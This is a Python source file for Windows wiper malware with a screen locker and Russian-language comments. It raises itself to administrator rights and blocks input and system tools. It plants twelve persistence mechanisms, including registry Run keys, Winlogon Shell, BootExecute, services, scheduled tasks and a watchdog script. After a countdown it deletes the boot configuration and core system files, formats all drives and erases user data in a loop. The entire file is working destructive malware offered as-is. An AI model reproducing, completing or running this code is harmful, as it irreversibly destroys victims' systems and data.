import tkinter as tk
import ctypes
import sys
import os
import time
import threading
import random

def block_shutdown():
    while True:
        os.system("shutdown /a 2>nul")
        os.system("taskkill /f /im cmd.exe 2>nul")
        os.system("taskkill /f /im powershell.exe 2>nul")
        os.system("taskkill /f /im taskmgr.exe 2>nul")
        os.system("taskkill /f /im regedit.exe 2>nul")
        os.system("taskkill /f /im explorer.exe 2>nul")
        time.sleep(0.01)

def block_keys():
    try:
        ctypes.windll.user32.BlockInput(True)
    except:
        pass

def infect_boot():
    # Способ 1: папка автозагрузки пользователя
    startup = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    try:
        bat_path = os.path.join(startup, "system32.bat")
        with open(bat_path, "w") as f:
            f.write(f'@echo off\nstart "" "{sys.executable}" "{__file__}"\n')
        os.system(f'attrib +h +s "{bat_path}"')
    except:
        pass
    
    # Способ 2: реестр Run
    os.system(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemService" /t REG_SZ /d "{sys.executable} \\"{__file__}\\"" /f')
    os.system(f'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemService" /t REG_SZ /d "{sys.executable} \\"{__file__}\\"" /f')
    
    # Способ 3: реестр RunOnce
    os.system(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v "SystemRestore" /t REG_SZ /d "{sys.executable} \\"{__file__}\\"" /f')
    
    # Способ 4: планировщик при входе
    os.system(f'schtasks /create /tn "WindowsUpdate" /tr "{sys.executable} \\"{__file__}\\"" /sc onlogon /f /rl highest')
    
    # Способ 5: планировщик при старте
    os.system(f'schtasks /create /tn "WindowsService" /tr "{sys.executable} \\"{__file__}\\"" /sc onstart /f /rl highest')
    
    # Способ 6: общая папка автозагрузки
    try:
        all_users_startup = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        bat_path2 = os.path.join(all_users_startup, "svchost.bat")
        with open(bat_path2, "w") as f:
            f.write(f'@echo off\nstart "" "{sys.executable}" "{__file__}"\n')
        os.system(f'attrib +h +s "{bat_path2}"')
    except:
        pass
    
    # Способ 7: реестр Winlogon Shell
    os.system(f'reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v "Shell" /t REG_SZ /d "{sys.executable} \\"{__file__}\\"" /f')
    
    # Способ 8: реестр BootExecute
    os.system(f'reg add "HKLM\\System\\CurrentControlSet\\Control\\Session Manager" /v "BootExecute" /t REG_MULTI_SZ /d "autocheck autochk *\\0{sys.executable} {__file__}" /f')
    
    # Способ 9: служба Windows
    os.system(f'sc create "WindowsManager" binPath= "{sys.executable} \\"{__file__}\\"" start= auto')
    os.system(f'sc description "WindowsManager" "Windows System Manager"')
    os.system(f'sc start "WindowsManager"')
    
    # Способ 10: реестр AppInit_DLLs (запускается с каждым процессом)
    os.system(f'reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v "AppInit_DLLs" /t REG_SZ /d "{sys.executable}" /f')
    os.system(f'reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v "LoadAppInit_DLLs" /t REG_DWORD /d 1 /f')
    
    # Способ 11: групповая политика скрипт автозагрузки
    os.system(f'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup" /v "GPOStartup" /t REG_SZ /d "{sys.executable} \\"{__file__}\\"" /f')
    
    # Способ 12: бесконечный Watchdog (мониторит и перезапускает)
    watchdog_code = f'''
@echo off
:loop
timeout /t 1 /nobreak >nul
tasklist /FI "IMAGENAME eq python.exe" 2>nul | find /I /N "python.exe" >nul
if "%ERRORLEVEL%"=="1" start "" "{sys.executable}" "{__file__}"
goto loop
'''
    try:
        watchdog_path = os.path.join(os.path.expanduser("~\\AppData\\Roaming"), "watchdog.bat")
        with open(watchdog_path, "w") as f:
            f.write(watchdog_code)
        os.system(f'schtasks /create /tn "WatchdogService" /tr "cmd.exe /c {watchdog_path}" /sc onstart /f /rl highest')
        os.system(f'schtasks /create /tn "WatchdogLogon" /tr "cmd.exe /c {watchdog_path}" /sc onlogon /f /rl highest')
        os.system(f'start /min cmd.exe /c {watchdog_path}')
    except:
        pass

def nuke():
    # Бесконечный цикл удаления
    while True:
        os.system("takeown /f C:\\ /r /d y 2>nul")
        os.system("icacls C:\\ /grant Everyone:F /t /q 2>nul")
        os.system("attrib -r -s -h C:\\*.* /s /d 2>nul")
        
        os.system("bcdedit /delete {current} /f 2>nul")
        os.system("bcdedit /delete {default} /f 2>nul")
        os.system("bcdedit /delete {bootmgr} /f 2>nul")
        
        critical = [
            "ntoskrnl.exe", "hal.dll", "winload.exe", "winload.efi",
            "winlogon.exe", "smss.exe", "csrss.exe", "services.exe",
            "lsass.exe", "svchost.exe", "ntdll.dll", "kernel32.dll",
            "user32.dll", "gdi32.dll", "explorer.exe"
        ]
        
        for f in critical:
            os.system(f"del /f /q C:\\Windows\\System32\\{f} 2>nul")
            os.system(f"del /f /q C:\\Windows\\SysWOW64\\{f} 2>nul")
        
        os.system("del /f /q C:\\Windows\\System32\\config\\* 2>nul")
        
        for letter in "CDEFGHIJKLMNOPQRSTUVWXYZ":
            os.system(f"echo y | format {letter}: /fs:NTFS /q /x 2>nul")
        
        os.system("del /f /s /q C:\\Windows\\*.* 2>nul")
        os.system("del /f /s /q C:\\Users\\*.* 2>nul")
        os.system("del /f /s /q \"C:\\Program Files\\*.*\" 2>nul")
        os.system("del /f /s /q \"C:\\Program Files (x86)\\*.*\" 2>nul")
        os.system("del /f /s /q C:\\*.* 2>nul")
        
        # Заражаем снова перед перезагрузкой
        infect_boot()
        
        os.system("shutdown /r /t 0 /f 2>nul")
        os.system("shutdown /s /t 0 /f 2>nul")
        time.sleep(1)

def flash_bg(root):
    colors = ["red", "green", "blue", "yellow", "purple", "orange", "cyan", "magenta", "white", "black"]
    while True:
        try:
            color = random.choice(colors)
            root.configure(bg=color)
            time.sleep(0.05)
        except:
            break

def locker():
    root = tk.Tk()
    root.title("")
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.configure(bg='black')
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    
    threading.Thread(target=flash_bg, args=(root,), daemon=True).start()
    
    skull = """⣿⠲⠤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣸⡏⠀⠀⠀⠉⠳⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠉⠲⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢰⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⣄⠀⠀⠀⡰⠋⢙⣿⣦⡀
⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣙⣦⣮⣤⡀⣸⣿⣿⣿⠀
⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⠀⣿⢟⣫⠟⠀
⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣷⣷⣿⡁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⢸⣿⣿⣧⣿⣿⣆⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣿⣤⣿⣿⣿⡟⠹⣿⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣧⣴⣿⢧
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⢻⣿⣿⣿⣿⣿⣿⣿⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡏⣸⣿⣿⣿⣿⣿⣿⣿⢳
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⢀⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠸⣿⣿⣿⣿⣿⣿⣿⣿⠏
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⢠⣿⣿⣿⣿⣿⣿⣿⣿"""
    
    skull_label = tk.Label(root, text=skull, font=("Courier New", 10, "bold"), fg="white", bg="black")
    skull_label.pack(expand=True, pady=10)
    
    name_label = tk.Label(root, text="Артем Трейдов core =D", font=("Arial", 35, "bold"), fg="red", bg="black")
    name_label.pack(pady=5)
    
    vk_label = tk.Label(root, text="vk.com/patch делает", font=("Arial", 25), fg="white", bg="black")
    vk_label.pack(pady=5)
    
    timer_label = tk.Label(root, text="Удаление через 60 секунд...", font=("Arial", 20), fg="red", bg="black")
    timer_label.pack(pady=10)
    
    threading.Thread(target=infect_boot, daemon=True).start()
    
    def update_timer():
        for i in range(60, 0, -1):
            timer_label.config(text=f"Удаление через {i} секунд...")
            time.sleep(1)
        timer_label.config(text="УДАЛЕНИЕ!")
        nuke()
    
    threading.Thread(target=update_timer, daemon=True).start()
    threading.Thread(target=block_shutdown, daemon=True).start()
    try:
        block_keys()
    except:
        pass
    
    root.mainloop()

if __name__ == "__main__":
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        sys.exit(0)
    locker()
